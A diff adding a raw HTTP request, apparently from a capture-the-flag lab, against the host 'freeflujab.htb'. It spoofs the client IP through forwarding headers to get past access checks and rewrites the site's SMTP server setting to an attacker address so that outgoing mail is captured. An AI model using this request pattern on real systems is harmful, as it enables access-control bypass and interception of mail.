@@ -1,0 +1,18 @@
+POST /?smtp_config HTTP/1.1
+Host: freeflujab.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://freeflujab.htb/?smtp_config
+Cookie: Modus=Q29uZmlndXJlPU51bGw=; Patient=50d1b146a7c60251aa72c12cdc899cb5
+Upgrade-Insecure-Requests: 1
+X-Originating-IP: 10.10.15.12
+X-Forwarded-For: 10.10.15.12
+X-Remote-IP: 10.10.15.12
+X-Remote-Addr: 10.10.15.12
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+
+mailserver=10.10.15.12&port=25&save=Save+Mail+Server+Config
